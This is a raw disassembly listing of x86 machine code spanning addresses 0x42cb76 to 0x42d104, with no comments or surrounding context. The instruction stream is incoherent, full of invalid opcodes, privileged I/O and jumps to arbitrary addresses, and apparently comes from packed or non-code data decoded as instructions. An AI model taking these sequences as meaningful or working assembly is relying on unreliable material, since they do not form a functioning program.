  42cb76:	b5 77                	mov    $0x77,%ch
  42cb78:	17                   	pop    %ss
  42cb79:	ee                   	out    %al,(%dx)
  42cb7a:	59                   	pop    %ecx
  42cb7b:	56                   	push   %esi
  42cb7c:	e8 f6 16 1b 0c       	call   0xc5de277
  42cb81:	e9 6b 1e c3 61       	jmp    0x6205e9f1
  42cb86:	42                   	inc    %edx
  42cb87:	6c                   	insb   (%dx),%es:(%edi)
  42cb88:	e8 e8 0d 1b d9       	call   0xd95dd975
  42cb8d:	fe 0d 64 c3 8f d4    	decb   0xd48fc364
  42cb93:	18 79 d7             	sbb    %bh,-0x29(%ecx)
  42cb96:	4e                   	dec    %esi
  42cb97:	f8                   	clc
  42cb98:	03 79 6e             	add    0x6e(%ecx),%edi
  42cb9b:	8e 1e                	mov    (%esi),%ds
  42cb9d:	cb                   	lret
  42cb9e:	b1 0a                	mov    $0xa,%cl
  42cba0:	68 20 2f 59 6c       	push   $0x6c592f20
  42cba5:	f2 75 33             	bnd jne 0x42cbdb
  42cba8:	30 14 1a             	xor    %dl,(%edx,%ebx,1)
  42cbab:	47                   	inc    %edi
  42cbac:	b6 90                	mov    $0x90,%dh
  42cbae:	cf                   	iret
  42cbaf:	c8 b3 57 de          	enter  $0x57b3,$0xde
  42cbb3:	9e                   	sahf
  42cbb4:	3c f6                	cmp    $0xf6,%al
  42cbb6:	f7 63 17             	mull   0x17(%ebx)
  42cbb9:	de 3b                	fidivrs (%ebx)
  42cbbb:	40                   	inc    %eax
  42cbbc:	a0 1e 2f 29 00       	mov    0x292f1e,%al
  42cbc1:	bd 75 ec 4d be       	mov    $0xbe4dec75,%ebp
  42cbc6:	ae                   	scas   %es:(%edi),%al
  42cbc7:	2a 6e 48             	sub    0x48(%esi),%ch
  42cbca:	29 cc                	sub    %ecx,%esp
  42cbcc:	1e                   	push   %ds
  42cbcd:	4d                   	dec    %ebp
  42cbce:	4d                   	dec    %ebp
  42cbcf:	78 b3                	js     0x42cb84
  42cbd1:	37                   	aaa
  42cbd2:	58                   	pop    %eax
  42cbd3:	0f cf                	bswap  %edi
  42cbd5:	f3 1b 72 92          	repz sbb -0x6e(%edx),%esi
  42cbd9:	ee                   	out    %al,(%dx)
  42cbda:	62 1f                	bound  %ebx,(%edi)
  42cbdc:	50                   	push   %eax
  42cbdd:	da a2 73 1e 72 90    	fisubl -0x6f8de18d(%edx)
  42cbe3:	af                   	scas   %es:(%edi),%eax
  42cbe4:	6c                   	insb   (%dx),%es:(%edi)
  42cbe5:	49                   	dec    %ecx
  42cbe6:	82 da a2             	sbb    $0xa2,%dl
  42cbe9:	ff 35 26 cd 96 bd    	push   0xbd96cd26
  42cbef:	a1 10 55 95 0e       	mov    0xe955510,%eax
  42cbf4:	f2 6d                	repnz insl (%dx),%es:(%edi)
  42cbf6:	cc                   	int3
  42cbf7:	3a de                	cmp    %dh,%bl
  42cbf9:	78 3a                	js     0x42cc35
  42cbfb:	47                   	inc    %edi
  42cbfc:	db a1 7b 21 9f 4b    	(bad) 0x4b9f217b(%ecx)
  42cc02:	c0 db a1             	rcr    $0xa1,%bl
  42cc05:	d0 ac 75 c8 41 be 01 	shrb   $1,0x1be41c8(%ebp,%esi,2)
  42cc0c:	9c                   	pushf
  42cc0d:	bf 0c d0 ac c9       	mov    $0xc9acd00c,%edi
  42cc12:	67 c0 5e d8 a4       	rcrb   $0xa4,-0x28(%bp)
  42cc17:	29 a8 e2 f6 4a 9e    	sub    %ebp,-0x61b5091e(%eax)
  42cc1d:	93                   	xchg   %eax,%ebx
  42cc1e:	b3 19                	mov    $0x19,%bl
  42cc20:	38 b4 c8 f9 06 e4 59 	cmp    %dh,0x59e406f9(%eax,%ecx,8)
  42cc27:	6d                   	insl   (%dx),%es:(%edi)
  42cc28:	cf                   	iret
  42cc29:	ad                   	lods   %ds:(%esi),%eax
  42cc2a:	c0 29 9e             	shrb   $0x9e,(%ecx)
  42cc2d:	01 79 21             	add    %edi,0x21(%ecx)
  42cc30:	07                   	pop    %es
  42cc31:	cf                   	iret
  42cc32:	ad                   	lods   %ds:(%esi),%eax
  42cc33:	ce                   	into
  42cc34:	ae                   	scas   %es:(%edi),%al
  42cc35:	5e                   	pop    %esi
  42cc36:	c8 41 9e cc          	enter  $0x9e41,$0xcc
  42cc3a:	74 ce                	je     0x42cc0a
  42cc3c:	ae                   	scas   %es:(%edi),%al
  42cc3d:	cd af                	int    $0xaf
  42cc3f:	72 90                	jb     0x42cbd1
  42cc41:	67 40                	addr16 inc %eax
  42cc43:	d8 4a cd             	fmuls  -0x33(%edx)
  42cc46:	af                   	scas   %es:(%edi),%eax
  42cc47:	f0 cc                	lock int3
  42cc49:	74 4f                	je     0x42cc9a
  42cc4b:	d1 ab 41 41 fc 34    	shrl   $1,0x34fc4141(%ebx)
  42cc51:	d6                   	salc
  42cc52:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42cc53:	48                   	dec    %eax
  42cc54:	c2 73 93             	ret    $0x9373
  42cc57:	8c e4                	mov    %fs,%esp
  42cc59:	32 0f                	xor    (%edi),%cl
  42cc5b:	27                   	daa
  42cc5c:	64 27                	fs daa
  42cc5e:	ec                   	in     (%dx),%al
  42cc5f:	1d e1 10 fd d7       	sbb    $0xd7fd10e1,%eax
  42cc64:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42cc65:	30 58 16             	xor    %bl,0x16(%eax)
  42cc68:	92                   	xchg   %eax,%edx
  42cc69:	cf                   	iret
  42cc6a:	e8 d7 a5 10 b1       	call   0xb1537246
  42cc6f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42cc70:	33 cf                	xor    %edi,%ecx
  42cc72:	3c d9                	cmp    $0xd9,%al
  42cc74:	a3 98 00 5c 0e       	mov    %eax,0xe5c0098
  42cc79:	76 b6                	jbe    0x42cc31
  42cc7b:	23 1b                	and    (%ebx),%ebx
  42cc7d:	eb f0                	jmp    0x42cc6f
  42cc7f:	40                   	inc    %eax
  42cc80:	50                   	push   %eax
  42cc81:	09 90 a2 0c d8 0b    	or     %edx,0xbd80ca2(%eax)
  42cc87:	e3 cc                	jecxz  0x42cc55
  42cc89:	b0 14                	mov    $0x14,%al
  42cc8b:	dc a0 cc ec 4e 76    	fsubl  0x764eeccc(%eax)
  42cc91:	36 f9                	ss stc
  42cc93:	7d f5                	jge    0x42cc8a
  42cc95:	19 38                	sbb    %edi,(%eax)
  42cc97:	29 dd                	sub    %ebx,%ebp
  42cc99:	9f                   	lahf
  42cc9a:	66 93                	xchg   %ax,%bx
  42cc9c:	67 40                	addr16 inc %eax
  42cc9e:	f8                   	clc
  42cc9f:	53                   	push   %ebx
  42cca0:	19 81 cd d7 92 d9    	sbb    %eax,-0x266d2833(%ecx)
  42cca6:	7c 08                	jl     0x42ccb0
  42cca8:	6a 05                	push   $0x5
  42ccaa:	41                   	inc    %ecx
  42ccab:	d2 f3                	shl    %cl,%bl
  42ccad:	d0 6e 14             	shrb   $1,0x14(%esi)
  42ccb0:	98                   	cwtl
  42ccb1:	fc                   	cld
  42ccb2:	61                   	popa
  42ccb3:	41                   	inc    %ecx
  42ccb4:	f5                   	cmc
  42ccb5:	0c b0                	or     $0xb0,%al
  42ccb7:	73 29                	jae    0x42cce2
  42ccb9:	36 d9 7a eb          	fnstcw %ss:-0x15(%edx)
  42ccbd:	bc 9b eb f8 fd       	mov    $0xfdf8eb9b,%esp
  42ccc2:	41                   	inc    %ecx
  42ccc3:	03 0b                	add    (%ebx),%ecx
  42ccc5:	bc 05 c9 28 eb       	mov    $0xeb28c905,%esp
  42ccca:	fd                   	std
  42cccb:	b3 24                	mov    $0x24,%bl
  42cccd:	b5 ec                	mov    $0xec,%ch
  42cccf:	7a 3a                	jp     0x42cd0b
  42ccd1:	78 1a                	js     0x42cced
  42ccd3:	90                   	nop
  42ccd4:	9f                   	lahf
  42ccd5:	69 52 7a d2 48 d7 a5 	imul   $0xa5d748d2,0x7a(%edx),%edx
  42ccdc:	cc                   	int3
  42ccdd:	c1 59 10 68          	rcrl   $0x68,0x10(%ecx)
  42cce1:	22 4b 3f             	and    0x3f(%ebx),%cl
  42cce4:	26 04 6b             	es add $0x6b,%al
  42cce7:	0b 17                	or     (%edi),%edx
  42cce9:	3c 41                	cmp    $0x41,%al
  42cceb:	cb                   	lret
  42ccec:	5e                   	pop    %esi
  42cced:	d3 84 a2 49 1a 90 0e 	roll   %cl,0xe901a49(%edx,%eiz,4)
  42ccf4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42ccf5:	e1 5f                	loope  0x42cd56
  42ccf7:	b0 0b                	mov    $0xb,%al
  42ccf9:	56                   	push   %esi
  42ccfa:	0e                   	push   %cs
  42ccfb:	68 b8 0b 00 fc       	push   $0xfc000bb8
  42cd00:	58                   	pop    %eax
  42cd01:	73 97                	jae    0x42cc9a
  42cd03:	8c c1                	mov    %es,%ecx
  42cd05:	4f                   	dec    %edi
  42cd06:	fd                   	std
  42cd07:	0c 83                	or     $0x83,%al
  42cd09:	11 0e                	adc    %ecx,(%esi)
  42cd0b:	29 79 26             	sub    %edi,0x26(%ecx)
  42cd0e:	38 10                	cmp    %dl,(%eax)
  42cd10:	cc                   	int3
  42cd11:	60                   	pusha
  42cd12:	21 2f                	and    %ebp,(%edi)
  42cd14:	0c 85                	or     $0x85,%al
  42cd16:	1c 7a                	sbb    $0x7a,%al
  42cd18:	2c c8                	sub    $0xc8,%al
  42cd1a:	91                   	xchg   %eax,%ecx
  42cd1b:	dc 97 20 7a 08 8a    	fcoml  -0x75f785e0(%edi)
  42cd21:	de ec                	fsubrp %st,%st(4)
  42cd23:	0d 1b 54 13 58       	or     $0x5813541b,%eax
  42cd28:	ad                   	lods   %ds:(%esi),%eax
  42cd29:	13 b5 ec bd cb 34    	adc    0x34cbbdec(%ebp),%esi
  42cd2f:	94                   	xchg   %eax,%esp
  42cd30:	d6                   	salc
  42cd31:	1f                   	pop    %ds
  42cd32:	0d 0e b8 9b 9a       	or     $0x9a9bb80e,%eax
  42cd37:	b1 cd                	mov    $0xcd,%cl
  42cd39:	10 68 2c             	adc    %ch,0x2c(%eax)
  42cd3c:	5f                   	pop    %edi
  42cd3d:	e5 05                	in     $0x5,%eax
  42cd3f:	31 18                	xor    %ebx,(%eax)
  42cd41:	12 29                	adc    (%ecx),%ch
  42cd43:	61                   	popa
  42cd44:	17                   	pop    %ss
  42cd45:	af                   	scas   %es:(%edi),%eax
  42cd46:	55                   	push   %ebp
  42cd47:	ca bc 19             	lret   $0x19bc
  42cd4a:	c8 20 03 ac          	enter  $0x320,$0xac
  42cd4e:	9e                   	sahf
  42cd4f:	89 01                	mov    %eax,(%ecx)
  42cd51:	b7 3a                	mov    $0x3a,%bh
  42cd53:	d8 45 f0             	fadds  -0x10(%ebp)
  42cd56:	aa                   	stos   %al,%es:(%edi)
  42cd57:	83 65 bd eb          	andl   $0xffffffeb,-0x43(%ebp)
  42cd5b:	07                   	pop    %es
  42cd5c:	b7 e8                	mov    $0xe8,%bh
  42cd5e:	4a                   	dec    %edx
  42cd5f:	b0 dc                	mov    $0xdc,%al
  42cd61:	40                   	inc    %eax
  42cd62:	e0 06                	loopne 0x42cd6a
  42cd64:	3b 7f 7d             	cmp    0x7d(%edi),%edi
  42cd67:	22 0c 6f             	and    (%edi,%ebp,2),%cl
  42cd6a:	8f                   	(bad)
  42cd6b:	61                   	popa
  42cd6c:	34 74                	xor    $0x74,%al
  42cd6e:	34 88                	xor    $0x88,%al
  42cd70:	55                   	push   %ebp
  42cd71:	f0 57                	lock push %edi
  42cd73:	6c                   	insb   (%dx),%es:(%edi)
  42cd74:	09 c7                	or     %eax,%edi
  42cd76:	ce                   	into
  42cd77:	32 dc                	xor    %ah,%bl
  42cd79:	5d                   	pop    %ebp
  42cd7a:	eb cf                	jmp    0x42cd4b
  42cd7c:	68 83 af 72 e3       	push   $0xe372af83
  42cd81:	15 3f 02 dc ed       	adc    $0xeddc023f,%eax
  42cd86:	b8 1e 05 63 d6       	mov    $0xd663051e,%eax
  42cd8b:	1d 6a 50 a2 62       	sbb    $0x62a2506a,%eax
  42cd90:	c8 f6 32 cf          	enter  $0x32f6,$0xcf
  42cd94:	20 4e ff             	and    %cl,-0x1(%esi)
  42cd97:	30 2b                	xor    %ch,(%ebx)
  42cd99:	b0 de                	mov    $0xde,%al
  42cd9b:	d8 42 0e             	fadds  0xe(%edx)
  42cd9e:	db a1 20 22 2b 0b    	(bad) 0xb2b2220(%ecx)
  42cda4:	74 3f                	je     0x42cde5
  42cda6:	d9 e2                	(bad)
  42cda8:	5d                   	pop    %ebp
  42cda9:	54                   	push   %esp
  42cdaa:	6a 44                	push   $0x44
  42cdac:	6a b7                	push   $0xffffffb7
  42cdae:	ac                   	lods   %ds:(%esi),%al
  42cdaf:	f0 72 d6             	lock jb 0x42cd88
  42cdb2:	de eb                	fsubrp %st,%st(3)
  42cdb4:	80 24 e4 0c          	andb   $0xc,(%esp,%eiz,8)
  42cdb8:	90                   	nop
  42cdb9:	0f 15 01             	unpckhps (%ecx),%xmm0
  42cdbc:	50                   	push   %eax
  42cdbd:	f3 64 58             	repz fs pop %eax
  42cdc0:	01 1f                	add    %ebx,(%edi)
  42cdc2:	5c                   	pop    %esp
  42cdc3:	c9                   	leave
  42cdc4:	52                   	push   %edx
  42cdc5:	e7 eb                	out    %eax,$0xeb
  42cdc7:	94                   	xchg   %eax,%esp
  42cdc8:	db 58 77             	fistpl 0x77(%eax)
  42cdcb:	ff f2                	push   %edx
  42cdcd:	bb c8 37 81 1c       	mov    $0x1c8137c8,%ebx
  42cdd2:	b0 64                	mov    $0x64,%al
  42cdd4:	28 59 60             	sub    %bl,0x60(%ecx)
  42cdd7:	07                   	pop    %es
  42cdd8:	a3 37 35 23 6a       	mov    %eax,0x6a233537
  42cddd:	dc 9c 2e e4 00 f2 1c 	fcompl 0x1cf200e4(%esi,%ebp,1)
  42cde4:	74 2a                	je     0x42ce10
  42cde6:	a0 98 72 25 9f       	mov    0x9f257298,%al
  42cdeb:	03 88 fb f1 ac 5a    	add    0x5aacf1fb(%eax),%ecx
  42cdf1:	25 fb 69 5b 34       	and    $0x345b69fb,%eax
  42cdf6:	08 00                	or     %al,(%eax)
  42cdf8:	d3 4a df             	rorl   %cl,-0x21(%edx)
  42cdfb:	b9 f4 1e da 15       	mov    $0x15da1ef4,%ecx
  42ce00:	7b 48                	jnp    0x42ce4a
  42ce02:	d4 f7                	aam    $0xf7
  42ce04:	05 00 5e 29 60       	add    $0x60295e00,%eax
  42ce09:	ee                   	out    %al,(%dx)
  42ce0a:	0f 84 af 55 f9 3c    	je     0x3d3c23bf
  42ce10:	17                   	pop    %ss
  42ce11:	75 32                	jne    0x42ce45
  42ce13:	f2 dc 29             	repnz fsubrl (%ecx)
  42ce16:	a0 98 d0 d0 85       	mov    0x85d0d098,%al
  42ce1b:	d8 25 8d f1 3d 38    	fsubs  0x383df18d
  42ce21:	22 0c 95 cc 22 8b cf 	and    -0x3074dd34(,%edx,4),%cl
  42ce28:	8d                   	lea    (bad),%ecx
  42ce29:	cf                   	iret
  42ce2a:	cc                   	int3
  42ce2b:	74 66                	je     0x42ce93
  42ce2d:	79 dc                	jns    0x42ce0b
  42ce2f:	f7 00 08 53 f0 22    	testl  $0x22f05308,(%eax)
  42ce35:	9b                   	fwait
  42ce36:	19 f8                	sbb    %edi,%eax
  42ce38:	50                   	push   %eax
  42ce39:	d0 98 bd 76 2e dd    	rcrb   $1,-0x22d18943(%eax)
  42ce3f:	a8 02                	test   $0x2,%al
  42ce41:	eb 2f                	jmp    0x42ce72
  42ce43:	ba cc f7 07 2c       	mov    $0x2c07f7cc,%edx
  42ce48:	9b                   	fwait
  42ce49:	f4                   	hlt
  42ce4a:	90                   	nop
  42ce4b:	86 26                	xchg   %ah,(%esi)
  42ce4d:	7d 6a                	jge    0x42ceb9
  42ce4f:	64 46                	fs inc %esi
  42ce51:	53                   	push   %ebx
  42ce52:	5b                   	pop    %ebx
  42ce53:	92                   	xchg   %eax,%edx
  42ce54:	de 67 dc             	fisubs -0x24(%edi)
  42ce57:	77 ac                	ja     0x42ce05
  42ce59:	2e ce                	cs into
  42ce5b:	35 58 9b 63 d1       	xor    $0xd1639b58,%eax
  42ce60:	15 0d c9 17 5c       	adc    $0x5c17c90d,%eax
  42ce65:	50                   	push   %eax
  42ce66:	73 22                	jae    0x42ce8a
  42ce68:	f6 ac 61 74 95 3c b8 	imulb  -0x47c36a8c(%ecx,%eiz,2)
  42ce6f:	f7 f0                	div    %eax
  42ce71:	61                   	popa
  42ce72:	0e                   	push   %cs
  42ce73:	bf 2e 64 5b 1c       	mov    $0x1c5b642e,%edi
  42ce78:	40                   	inc    %eax
  42ce79:	f4                   	hlt
  42ce7a:	66 dd ea             	data16 fucomp %st(2)
  42ce7d:	63 f6                	arpl   %esi,%esi
  42ce7f:	b2 43                	mov    $0x43,%dl
  42ce81:	0e                   	push   %cs
  42ce82:	23 44 57 d6          	and    -0x2a(%edi,%edx,2),%eax
  42ce86:	ce                   	into
  42ce87:	ef                   	out    %eax,(%dx)
  42ce88:	80 5c c2 34 44       	sbbb   $0x44,0x34(%edx,%eax,8)
  42ce8d:	a8 af                	test   $0xaf,%al
  42ce8f:	e7 4b                	out    %eax,$0x4b
  42ce91:	4e                   	dec    %esi
  42ce92:	08 cf                	or     %cl,%bh
  42ce94:	a8 af                	test   $0xaf,%al
  42ce96:	6e                   	outsb  %ds:(%esi),(%dx)
  42ce97:	30 a8 af 73 59 78    	xor    %ch,0x785973af(%eax)
  42ce9d:	b1 a4                	mov    $0xa4,%cl
  42ce9f:	25 05 0d 3d ac       	and    $0xac3d0d05,%eax
  42cea4:	af                   	scas   %es:(%edi),%eax
  42cea5:	3b e4                	cmp    %esp,%esp
  42cea7:	c8 e7 50 4e          	enter  $0x50e7,$0x4e
  42ceab:	b0 b1                	mov    $0xb1,%al
  42cead:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42ceae:	af                   	scas   %es:(%edi),%eax
  42ceaf:	8b 1e                	mov    (%esi),%ebx
  42ceb1:	0d 4b f6 1e 80       	or     $0x801ef64b,%eax
  42ceb6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42ceb7:	05 19 20 84 cd       	add    $0xcd842019,%eax
  42cebc:	4a                   	dec    %edx
  42cebd:	7c d8                	jl     0x42ce97
  42cebf:	08 e8                	or     %ch,%al
  42cec1:	78 e0                	js     0x42cea3
  42cec3:	eb 0e                	jmp    0x42ced3
  42cec5:	be 9d 1f 28 0d       	mov    $0xd281f9d,%esi
  42ceca:	09 b8 b0 8c 62 48    	or     %edi,0x48628cb0(%eax)
  42ced0:	7a e7                	jp     0x42ceb9
  42ced2:	e0 64                	loopne 0x42cf38
  42ced4:	53                   	push   %ebx
  42ced5:	8f                   	(bad)
  42ced6:	f0 ef                	lock out %eax,(%dx)
  42ced8:	64 49                	fs dec %ecx
  42ceda:	39 1a                	cmp    %ebx,(%edx)
  42cedc:	1c 6d                	sbb    $0x6d,%al
  42cede:	e2 43                	loop   0x42cf23
  42cee0:	21 fd                	and    %edi,%ebp
  42cee2:	05 f4 83 59 d4       	add    $0xd45983f4,%eax
  42cee7:	86 f0                	xchg   %dh,%al
  42cee9:	54                   	push   %esp
  42ceea:	67 1b 6c 16          	sbb    0x16(%si),%ebp
  42ceee:	78 0c                	js     0x42cefc
  42cef0:	1a a1 7b 04 e7 83    	sbb    -0x7c18fb85(%ecx),%ah
  42cef6:	c0 07 1f             	rolb   $0x1f,(%edi)
  42cef9:	fc                   	cld
  42cefa:	ca 50 3b             	lret   $0x3b50
  42cefd:	c4 01                	les    (%ecx),%eax
  42ceff:	d9 b3 6c 7c 7a 0c    	fnstenv 0xc7a7c6c(%ebx)
  42cf05:	21 a3 24 0f 39 ec    	and    %esp,-0x13c6f0dc(%ebx)
  42cf0b:	68 fc 80 b7 d6       	push   $0xd6b780fc
  42cf10:	7d 64                	jge    0x42cf76
  42cf12:	70 01                	jo     0x42cf15
  42cf14:	e8 56 1f 88 06       	call   0x6caee6f
  42cf19:	08 8c e8 45 e3 45 16 	or     %cl,0x1645e345(%eax,%ebp,8)
  42cf20:	70 0a                	jo     0x42cf2c
  42cf22:	a9 68 05 36 70       	test   $0x70360568,%eax
  42cf27:	5b                   	pop    %ebx
  42cf28:	39 a2 e6 b3 41 54    	cmp    %esp,0x5441b3e6(%edx)
  42cf2e:	39 3e                	cmp    %edi,(%esi)
  42cf30:	c7                   	(bad)
  42cf31:	0e                   	push   %cs
  42cf32:	d6                   	salc
  42cf33:	c1 63 e8 17          	shll   $0x17,-0x18(%ebx)
  42cf37:	27                   	daa
  42cf38:	50                   	push   %eax
  42cf39:	fc                   	cld
  42cf3a:	50                   	push   %eax
  42cf3b:	fc                   	cld
  42cf3c:	fb                   	sti
  42cf3d:	98                   	cwtl
  42cf3e:	29 46 be             	sub    %eax,-0x42(%esi)
  42cf41:	f1                   	int1
  42cf42:	12 8b 40 0c 8b 0a    	adc    0xa8b0c40(%ebx),%cl
  42cf48:	9b                   	fwait
  42cf49:	bb 35 5d 1f 58       	mov    $0x581f5d35,%ebx
  42cf4e:	6a 2c                	push   $0x2c
  42cf50:	e4 1e                	in     $0x1e,%al
  42cf52:	41                   	inc    %ecx
  42cf53:	0d 56 dd ef f0       	or     $0xf0efdd56,%eax
  42cf58:	3e 10 8d 49 48 5e e8 	adc    %cl,%ds:-0x17a1b7b7(%ebp)
  42cf5f:	c3                   	ret
  42cf60:	1a 83 87 83 d9 1a    	sbb    0x1ad98387(%ebx),%al
  42cf66:	3f                   	aas
  42cf67:	3d 80 22 25 df       	cmp    $0xdf252280,%eax
  42cf6c:	c1 86 99 34 cd b2 68 	roll   $0x68,-0x4d32cb67(%esi)
  42cf73:	80 f7 b5             	xor    $0xb5,%bh
  42cf76:	25 06 23 0e 02       	and    $0x20e2306,%eax
  42cf7b:	0a 18                	or     (%eax),%bl
  42cf7d:	2f                   	das
  42cf7e:	78 c9                	js     0x42cf49
  42cf80:	0e                   	push   %cs
  42cf81:	81 03 b3 6a 1b 3b    	addl   $0x3b1b6ab3,(%ebx)
  42cf87:	3d 39 9b 99 06       	cmp    $0x6999b39,%eax
  42cf8c:	0d 63 59 74 20       	or     $0x20745963,%eax
  42cf91:	dc 66 b0             	fsubl  -0x50(%esi)
  42cf94:	80 30 1a             	xorb   $0x1a,(%eax)
  42cf97:	38 e8                	cmp    %ch,%al
  42cf99:	2d 04 60 9e c1       	sub    $0xc19e6004,%eax
  42cf9e:	3e 97                	ds xchg %eax,%edi
  42cfa0:	12 14 23             	adc    (%ebx,%eiz,1),%dl
  42cfa3:	18 1d 1d 68 93 a9    	sbb    %bl,0xa993681d
  42cfa9:	c4                   	(bad)
  42cfaa:	f8                   	clc
  42cfab:	23 bf c0 e9 0c af    	and    -0x50f31640(%edi),%edi
  42cfb1:	3e c7 05 8e 9b 10 64 	movl   $0xdc95bb2e,%ds:0x64109b8e
  42cfb8:	2e bb 95 dc 
  42cfbc:	3d 1a c3 43 01       	cmp    $0x143c31a,%eax
  42cfc1:	11 00                	adc    %eax,(%eax)
  42cfc3:	2d 14 30 1b 4c       	sub    $0x4c1b3014,%eax
  42cfc8:	2e 1e                	cs push %ds
  42cfca:	4a                   	dec    %edx
  42cfcb:	3b 3c 0a             	cmp    (%edx,%ecx,1),%edi
  42cfce:	70 36                	jo     0x42d006
  42cfd0:	d7                   	xlat   %ds:(%ebx)
  42cfd1:	56                   	push   %esi
  42cfd2:	28 1c d3             	sub    %bl,(%ebx,%edx,8)
  42cfd5:	3c ab                	cmp    $0xab,%al
  42cfd7:	d3 02                	roll   %cl,(%edx)
  42cfd9:	63 85 0c 1b f0 9f    	arpl   %eax,-0x600fe4f4(%ebp)
  42cfdf:	f0 c3                	lock ret
  42cfe1:	91                   	xchg   %eax,%ecx
  42cfe2:	05 66 4f d4 05       	add    $0x5d44f66,%eax
  42cfe7:	99                   	cltd
  42cfe8:	fc                   	cld
  42cfe9:	60                   	pusha
  42cfea:	82 3d 8c ce c9 b3 c3 	cmpb   $0xc3,0xb3c9ce8c
  42cff1:	75 2c                	jne    0x42d01f
  42cff3:	17                   	pop    %ss
  42cff4:	a3 07 5e 10 f8       	mov    %eax,0xf8105e07
  42cff9:	1f                   	pop    %ds
  42cffa:	1d 1f f6 c4 e4       	sbb    $0xe4c4f61f,%eax
  42cfff:	ac                   	lods   %ds:(%esi),%al
  42d000:	1c e8                	sbb    $0xe8,%al
  42d002:	7a 10                	jp     0x42d014
  42d004:	11 4d 0d             	adc    %ecx,0xd(%ebp)
  42d007:	9b                   	fwait
  42d008:	ec                   	in     (%dx),%al
  42d009:	fd                   	std
  42d00a:	30 c4                	xor    %al,%ah
  42d00c:	43                   	inc    %ebx
  42d00d:	76 64                	jbe    0x42d073
  42d00f:	ca 26 f4             	lret   $0xf426
  42d012:	26 06                	es push %es
  42d014:	b7 25                	mov    $0x25,%bh
  42d016:	03 16                	add    (%esi),%edx
  42d018:	00 b9 c4 d8 2d bf    	add    %bh,-0x40d2273c(%ecx)
  42d01e:	c6 81 91 1d e9 b8 1b 	movb   $0x1b,-0x4716e26f(%ecx)
  42d025:	1c 03                	sbb    $0x3,%al
  42d027:	7d e0                	jge    0x42d009
  42d029:	08 3c bd 14 08 52 0b 	or     %bh,0xb520814(,%edi,4)
  42d030:	df e8                	fucomip %st(0),%st
  42d032:	30 b9 67 c3 19 23    	xor    %bh,0x2319c367(%ecx)
  42d038:	2c aa                	sub    $0xaa,%al
  42d03a:	60                   	pusha
  42d03b:	96                   	xchg   %eax,%esi
  42d03c:	fe 0c f5 a4 9e fc e9 	decb   -0x1603615c(,%esi,8)
  42d043:	b2 82                	mov    $0x82,%dl
  42d045:	c2 04 00             	ret    $0x4
  42d048:	78 cc                	js     0x42d016
  42d04a:	04 93                	add    $0x93,%al
  42d04c:	a1 06 09 15 70       	mov    0x70150906,%eax
  42d051:	60                   	pusha
  42d052:	0c e9                	or     $0xe9,%al
  42d054:	de 24 21             	fisubs (%ecx,%eiz,1)
  42d057:	11 0f                	adc    %ecx,(%edi)
  42d059:	74 fe                	je     0x42d059
  42d05b:	56                   	push   %esi
  42d05c:	b4 56                	mov    $0x56,%ah
  42d05e:	ea 34 84 8b 7d 08 fc 	ljmp   $0xfc08,$0x7d8b8434
  42d065:	f3 aa                	rep stos %al,%es:(%edi)
  42d067:	5c                   	pop    %esp
  42d068:	67 45                	addr16 inc %ebp
  42d06a:	2b ad 10 24 c6 08    	sub    0x8c62410(%ebp),%ebp
  42d070:	47                   	inc    %edi
  42d071:	98                   	cwtl
  42d072:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42d073:	36 ff 69 95          	ljmp   *%ss:-0x6b(%ecx)
  42d077:	b1 8f                	mov    $0x8f,%cl
  42d079:	fd                   	std
  42d07a:	e8 89 08 07 08       	call   0x849d908
  42d07f:	89 48 04             	mov    %ecx,0x4(%eax)
  42d082:	08 0c 56             	or     %cl,(%esi,%edx,2)
  42d085:	a2 9f fb 11 05       	mov    %al,0x511fb9f
  42d08a:	20 2a                	and    %ch,(%edx)
  42d08c:	1e                   	push   %ds
  42d08d:	81 0c 11 2a 43 96 c3 	orl    $0xc396432a,(%ecx,%edx,1)
  42d094:	0e                   	push   %cs
  42d095:	88 10                	mov    %dl,(%eax)
  42d097:	0b 0c 14             	or     (%esp,%edx,1),%ecx
  42d09a:	91                   	xchg   %eax,%ecx
  42d09b:	97                   	xchg   %eax,%edi
  42d09c:	4d                   	dec    %ebp
  42d09d:	96                   	xchg   %eax,%esi
  42d09e:	08 18                	or     %bl,(%eax)
  42d0a0:	34 1c                	xor    $0x1c,%al
  42d0a2:	08 5d 11             	or     %bl,0x11(%ebp)
  42d0a5:	fb                   	sti
  42d0a6:	de 80 a0 11 09 c9    	fiadds -0x36f6ee60(%eax)
  42d0ac:	80 72 7e 38          	xorb   $0x38,0x7e(%edx)
  42d0b0:	fc                   	cld
  42d0b1:	4d                   	dec    %ebp
  42d0b2:	82 37 a8             	xorb   $0xa8,(%edi)
  42d0b5:	c7                   	(bad)
  42d0b6:	e8 cd 1b 1d b4       	call   0xb45fec88
  42d0bb:	ba b9 93 96 06       	mov    $0x69693b9,%edx
  42d0c0:	05 13 04 32 7f       	add    $0x7f320413,%eax
  42d0c5:	b9 6d ed 46 d1       	mov    $0xd146ed6d,%ecx
  42d0ca:	10 2b                	adc    %ch,(%ebx)
  42d0cc:	15 18 10 08 0c       	adc    $0xc081018,%eax
  42d0d1:	03 0a                	add    (%edx),%ecx
  42d0d3:	39 c2                	cmp    %eax,%edx
  42d0d5:	fe 0c eb             	decb   (%ebx,%ebp,8)
  42d0d8:	c3                   	ret
  42d0d9:	b0 01                	mov    $0x1,%al
  42d0db:	44                   	inc    %esp
  42d0dc:	ac                   	lods   %ds:(%esi),%al
  42d0dd:	c6                   	(bad)
  42d0de:	eb 35                	jmp    0x42d115
  42d0e0:	b0 0c                	mov    $0xc,%al
  42d0e2:	00 b4 10 bc b1 a7 ec 	add    %dh,-0x13584e44(%eax,%edx,1)
  42d0e9:	bb 06 ff 70 04       	mov    $0x470ff06,%ebx
  42d0ee:	e8 64 47 05 e9       	call   0xe9481857
  42d0f3:	87 bf c0 4b 0f 0b    	xchg   %edi,0xb0f4bc0(%edi)
  42d0f9:	12 80 07 0f d3 83    	adc    -0x7c2cf0f9(%eax),%al
  42d0ff:	e0 01                	loopne 0x42d102
  42d101:	6c                   	insb   (%dx),%es:(%edi)
  42d102:	ed                   	in     (%dx),%eax
  42d103:	93                   	xchg   %eax,%ebx
  42d104:	2d 41 1f 12 8a       	sub    $0x8a121f41,%eax
